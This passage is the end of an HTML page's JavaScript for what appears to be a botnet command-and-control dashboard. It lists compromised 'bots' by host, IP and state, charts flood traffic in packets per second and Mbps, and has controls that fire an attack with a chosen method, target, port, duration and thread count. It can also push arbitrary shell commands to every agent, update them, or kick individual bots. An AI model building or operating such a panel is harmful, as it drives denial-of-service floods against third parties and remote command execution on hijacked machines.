            if (event.target && event.target.closest('.row-button')) return;
            const id = row.getAttribute('data-id');
            expandedRowId = expandedRowId === id ? null : id;
            renderFleet();
          });
          row.addEventListener('keydown', (event) => {
            if (event.key === 'Enter' || event.key === ' ') {
              event.preventDefault();
              const id = row.getAttribute('data-id');
              expandedRowId = expandedRowId === id ? null : id;
              renderFleet();
            }
          });
        });
      }

      function normalizeSortValue(value) {
        if (value === null || value === undefined) return '';
        if (typeof value === 'number') return value;
        if (typeof value === 'string') {
          const lowered = value.toLowerCase();
          if (lowered === 'idle') return 0;
          if (lowered === 'attack') return 1;
          if (lowered === 'dead') return 2;
          return lowered;
        }
        return String(value).toLowerCase();
      }

      function getFilteredBots() {
        const query = textFilter.trim().toLowerCase();
        const source = state.bots || [];
        return source.filter((bot) => {
          const s = (bot.state || 'idle').toLowerCase();
          if (activeStateFilter !== 'all' && s !== activeStateFilter) return false;
          if (!query) return true;
          const haystack = [bot.host, bot.ip, bot.id, bot.os].join(' ').toLowerCase();
          return haystack.includes(query);
        });
      }

      function updateStateChips() {
        const counts = { all: state.bots.length || 0, idle: 0, attack: 0, dead: 0 };
        (state.bots || []).forEach((bot) => {
          const st = (bot.state || 'idle').toLowerCase();
          if (st === 'idle') counts.idle += 1;
          if (st === 'attack') counts.attack += 1;
          if (st === 'dead') counts.dead += 1;
        });

        const options = ['all', 'idle', 'attack', 'dead'];
        ui.stateChips.innerHTML = options.map((key) => {
          const isActive = key === activeStateFilter;
          const label = key.charAt(0).toUpperCase() + key.slice(1);
          return `<button type="button" class="chip ${isActive ? 'active' : ''}" data-state-filter="${key}" tabindex="0"><span>${label}</span><span class="chip-count">${counts[key] || 0}</span></button>`;
        }).join('');

        ui.stateChips.querySelectorAll('.chip').forEach((chip) => {
          chip.addEventListener('click', () => {
            activeStateFilter = chip.getAttribute('data-state-filter');
            renderFleet();
            updateStateChips();
          });
        });
      }

      function setupSortHeaders() {
        document.querySelectorAll('th.sortable').forEach((header) => {
          header.addEventListener('click', () => {
            const key = header.getAttribute('data-key');
            if (!key || key === 'kick') return;
            if (sortKey === key) sortDir *= -1;
            else {
              sortKey = key;
              sortDir = 1;
            }
            renderFleet();
          });
        });
      }

      function initCharts() {
        const canvasIds = ['ppsCanvas', 'mbpsCanvas'];
        canvasIds.forEach((id) => {
          const canvas = document.getElementById(id);
          const context = canvas.getContext('2d');
          const key = id.replace('Canvas', '');
          chartFallbacks[key] = { canvas, context };
        });

        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js';
        script.async = true;
        script.onload = () => {
          chartReady = true;
          const ppsCanvas = document.getElementById('ppsCanvas');
          const mbpsCanvas = document.getElementById('mbpsCanvas');
          chartInstances.pps = new Chart(ppsCanvas, {
            type: 'line',
            data: {
              labels: Array.from({ length: 60 }, (_, i) => i),
              datasets: [{
                data: Array(60).fill(0),
                borderColor: '#1f6feb',
                backgroundColor: 'rgba(31,111,235,0.12)',
                fill: false,
                borderWidth: 1.5,
                pointRadius: 0,
                tension: 0.25
              }]
            },
            options: {
              responsive: true,
              maintainAspectRatio: false,
              animation: false,
              plugins: { legend: { display: false }, tooltip: { enabled: false } },
              scales: {
                x: { display: false },
                y: { display: false }
              },
              elements: { line: { borderJoinStyle: 'round' } }
            }
          });

          chartInstances.mbps = new Chart(mbpsCanvas, {
            type: 'line',
            data: {
              labels: Array.from({ length: 60 }, (_, i) => i),
              datasets: [{
                data: Array(60).fill(0),
                borderColor: '#2ea043',
                backgroundColor: 'rgba(46,160,67,0.12)',
                fill: false,
                borderWidth: 1.5,
                pointRadius: 0,
                tension: 0.25
              }]
            },
            options: {
              responsive: true,
              maintainAspectRatio: false,
              animation: false,
              plugins: { legend: { display: false }, tooltip: { enabled: false } },
              scales: {
                x: { display: false },
                y: { display: false }
              },
              elements: { line: { borderJoinStyle: 'round' } }
            }
          });
          renderCharts();
        };
        script.onerror = () => {
          if (!fallbackWarned) {
            console.warn('Chart.js failed to load; using canvas fallback');
            fallbackWarned = true;
          }
          chartReady = false;
          renderCharts();
        };
        document.head.appendChild(script);
      }

      function pushChartSample(label, value) {
        const samples = label === 'pps' ? chartInstances.pps ? chartInstances.pps.data.datasets[0].data : [] : chartInstances.mbps ? chartInstances.mbps.data.datasets[0].data : [];
        if (samples.length) {
          if (samples.length >= 60) samples.shift();
          samples.push(Number(value) || 0);
        }
      }

      function renderCharts() {
        const ppsValues = (state.pps !== undefined ? [state.pps] : [0]);
        const mbpsValues = (state.mbps !== undefined ? [state.mbps] : [0]);

        if (chartReady && chartInstances.pps && chartInstances.mbps) {
          chartInstances.pps.data.datasets[0].data.push(Number(state.pps || 0));
          if (chartInstances.pps.data.datasets[0].data.length > 60) chartInstances.pps.data.datasets[0].data.shift();
          chartInstances.mbps.data.datasets[0].data.push(Number(state.mbps || 0));
          if (chartInstances.mbps.data.datasets[0].data.length > 60) chartInstances.mbps.data.datasets[0].data.shift();
          chartInstances.pps.update();
          chartInstances.mbps.update();
          return;
        }

        Object.entries(chartFallbacks).forEach(([key, info]) => {
          const context = info.context;
          const canvas = info.canvas;
          const values = key === 'pps' ? ppsValues : mbpsValues;
          renderFallbackSparkline(canvas, context, values, key === 'pps' ? '#1f6feb' : '#2ea043');
        });
      }

      function renderFallbackSparkline(canvas, context, values, color) {
        const width = canvas.width = canvas.clientWidth * window.devicePixelRatio || 300;
        const height = canvas.height = canvas.clientHeight * window.devicePixelRatio || 150;
        context.setTransform(1, 0, 0, 1, 0, 0);
        context.scale(window.devicePixelRatio || 1, window.devicePixelRatio || 1);
        context.clearRect(0, 0, canvas.clientWidth, canvas.clientHeight);
        context.strokeStyle = color;
        context.lineWidth = 1.5;
        context.beginPath();
        const arr = Array.isArray(values) ? values : [0];
        const max = Math.max(...arr, 1);
        const min = Math.min(...arr, 0);
        const range = Math.max(1, max - min);
        arr.forEach((value, index) => {
          const x = (index / Math.max(1, arr.length - 1)) * canvas.clientWidth;
          const y = canvas.clientHeight - ((Number(value) - min) / range) * (canvas.clientHeight - 8) - 4;
          if (index === 0) context.moveTo(x, y);
          else context.lineTo(x, y);
        });
        context.stroke();
        context.beginPath();
        for (let i = 0; i < 8; i += 1) {
          const x = (i / 7) * canvas.clientWidth;
          const y = (canvas.clientHeight * 0.5) + Math.sin(i * 2) * 6;
          context.moveTo(x, y);
          context.lineTo(x + 5, y + 3);
        }
        context.strokeStyle = 'rgba(255,255,255,0.08)';
        context.stroke();
      }

      function fireAttack() {
        const target = (ui.targetInput.value || '').trim();
        if (!target) {
          toast('error', 'target required');
          ui.targetInput.focus();
          return;
        }

        if (state.job && !ui.dontAskBox.checked && !fireConfirmMode) {
          fireConfirmMode = true;
          ui.fireInlineConfirm.classList.remove('hidden');
          toast('info', 'replaces current job - click again');
          return;
        }

        fireConfirmMode = false;
        ui.fireInlineConfirm.classList.add('hidden');

        const params = {
          method: ui.methodSelect.value,
          target,
          port: ui.portInput.value,
          dur: parseDuration(ui.durationInput.value),
          threads: ui.threadsInput.value,
          procs: ui.procsInput.value
        };

        fetch(buildApiUrl('/api/fire', params))
          .then(async (response) => {
            if (!response.ok) {
              const status = response.status || 0;
              if (response.status === 401) {
                showBadToken();
              } else {
                toast('error', `HTTP ${status}`);
              }
              throw new Error(String(status));
            }
            return response.json();
          })
          .then((payload) => {
            if (payload && payload.ok) {
              toast('success', `fire ok, bots ${payload.bots || 0}`);
              addEvent('success', `fire: ${ui.methodSelect.value} ${target}`);
              ui.targetInput.focus();
            }
          })
          .catch((error) => {
            if (String(error.message) !== '401') {
              console.error('fire failed', error);
            }
          });
      }

      function handleStop() {
        fetch(buildApiUrl('/api/stop'))
          .then(async (response) => {
            if (!response.ok) {
              const status = response.status || 0;
              if (response.status === 401) {
                showBadToken();
              } else {
                toast('error', `HTTP ${status}`);
              }
              throw new Error(String(status));
            }
            return response.json();
          })
          .then((payload) => {
            if (payload && payload.ok) {
              toast('success', 'stopped');
              addEvent('warn', 'stop');
            }
          })
          .catch((error) => {
            if (String(error.message) !== '401') {
              console.error('stop failed', error);
            }
          });
      }

      function handleUpdate() {
        fetch(buildApiUrl('/api/update'))
          .then(async (response) => {
            if (!response.ok) {
              const status = response.status || 0;
              if (response.status === 401) {
                showBadToken();
              } else {
                toast('error', `HTTP ${status}`);
              }
              throw new Error(String(status));
            }
            return response.json();
          })
          .then((payload) => {
            if (payload && payload.ok) {
              toast('success', `updated ${payload.pushed || 0}`);
              addEvent('info', 'update all');
            }
          })
          .catch((error) => {
            if (String(error.message) !== '401') {
              console.error('update failed', error);
            }
          });
      }

      function kickBot(id) {
        if (!id) return;
        fetch(buildApiUrl('/api/kick', { id }))
          .then(async (response) => {
            if (!response.ok) {
              const status = response.status || 0;
              if (response.status === 401) {
                showBadToken();
              } else {
                toast('error', `HTTP ${status}`);
              }
              throw new Error(String(status));
            }
            return response.json();
          })
          .then((payload) => {
            if (payload && payload.ok) {
              toast('success', `kicked ${id}`);
              addEvent('warn', `kick ${id}`);
            }
          })
          .catch((error) => {
            if (String(error.message) !== '401') {
              console.error('kick failed', error);
            }
          });
      }

      function runExec() {
        const command = ui.commandInput.value.trim();
        if (!command) {
          toast('error', 'command required');
          ui.commandInput.focus();
          return;
        }
        saveCommandHistory(command);
        fetch(buildApiUrl('/api/exec', { cmd: command }))
          .then(async (response) => {
            if (!response.ok) {
              const status = response.status || 0;
              if (response.status === 401) {
                showBadToken();
              } else {
                toast('error', `HTTP ${status}`);
              }
              throw new Error(String(status));
            }
            return response.json();
          })
          .then((payload) => {
            if (payload && payload.ok) {
              const count = payload.pushed || 0;
              toast('success', `sent to ${count} agents`);
              addEvent('success', `exec: ${command}`);
              ui.commandInput.value = '';
            }
          })
          .catch((error) => {
            if (String(error.message) !== '401') {
              console.error('exec failed', error);
            }
          });
      }

      function safeJsonParse(text) {
        try { return JSON.parse(text); } catch (err) { return null; }
      }

      async function fetchState() {
        if (inFlight || document.hidden) return;
        inFlight = true;
        setConnectionDot('amber');
        const seq = ++requestSeq;
        try {
          const response = await fetch(buildApiUrl('/api/state'));
          if (!response.ok) {
            const text = await response.text();
            const payload = safeJsonParse(text);
            if (response.status === 401 || (payload && payload.e === 'auth')) {
              showBadToken();
            } else {
              toast('error', `HTTP ${response.status}`);
            }
            throw new Error(String(response.status));
          }
          const payload = await response.json();
          if (seq !== requestSeq) return;
          hideBadToken();
          applyState(payload);
          setConnectionDot('green');
          refreshMs = REFRESH_MS;
          scheduleRefresh(refreshMs);
        } catch (error) {
          if (seq !== requestSeq) return;
          setConnectionDot('red');
          refreshMs = BACKOFF_MS;
          toast('error', `HTTP ${error.message}`);
          scheduleRefresh(refreshMs);
        } finally {
          inFlight = false;
        }
      }

      function scheduleRefresh(delay) {
        if (refreshTimer) clearTimeout(refreshTimer);
        refreshTimer = setTimeout(() => {
          if (document.hidden) {
            scheduleRefresh(REFRESH_MS);
            return;
          }
          if (!inFlight) {
            fetchState();
          }
        }, delay);
      }

      function applyState(payload) {
        state.online = Number(payload.online || 0);
        state.total = Number(payload.total || 0);
        state.attacking = Number(payload.attacking || 0);
        state.pps = Number(payload.pps || 0);
        state.mbps = Number(payload.mbps || 0);
        state.uptime = Number(payload.uptime || 0);
        state.now = Number(payload.now || Date.now() / 1000);
        state.job = payload.job || null;
        state.bots = Array.isArray(payload.bots) ? payload.bots : [];
        state.truncated = Number(payload.truncated || 0);
        serverOffsetMs = (state.now * 1000) - Date.now();

        const before = lastSeenBotIds;
        const now = new Set((state.bots || []).map((bot) => bot.id));
        for (const id of [...now].filter((id) => !before.has(id))) {
          addEvent('info', `bot online ${id}`);
        }
        for (const id of [...before].filter((id) => !now.has(id))) {
          addEvent('warn', `bot offline ${id}`);
        }
        lastSeenBotIds = now;

        renderTopBar();
        renderJobBanner();
        renderCharts();
        updateStateChips();
        renderFleet();
      }

      function setupGlobalKeys() {
        document.addEventListener('keydown', (event) => {
          const tag = document.activeElement && document.activeElement.tagName;
          const isTextField = tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT';
          if (event.code === 'Space' && !isTextField) {
            event.preventDefault();
            handleStop();
          }
          if (event.key && event.key.toLowerCase() === 'f' && !isTextField) {
            event.preventDefault();
            ui.targetInput.focus();
          }
          if (event.key === 'Escape') {
            ui.fleetFilter.value = '';
            textFilter = '';
            activeStateFilter = 'all';
            renderFleet();
            updateStateChips();
          }
        });

        document.addEventListener('visibilitychange', () => {
          if (!document.hidden) {
            fetchState();
          }
        });
      }

      function bindFilterControls() {
        ui.fleetFilter.addEventListener('input', (event) => {
          textFilter = event.target.value || '';
          renderFleet();
        });
        document.querySelectorAll('th.sortable').forEach((header) => {
          header.addEventListener('click', () => {
            const key = header.getAttribute('data-key');
            if (!key || key === 'kick') return;
            if (sortKey === key) sortDir *= -1;
            else { sortKey = key; sortDir = 1; }
            renderFleet();
          });
        });
      }

      function init() {
        restoreForm();
        bindForm();
        bindFilterControls();
        setupGlobalKeys();
        loadCommandHistory();
        addEvent('info', 'session ready');
        initCharts();
        renderTopBar();
        renderJobBanner();
        renderFleet();
        updateStateChips();
        setConnectionDot('amber');
        scheduleRefresh(0);
      }

      init();
    })();
  </script>
</body>
</html>
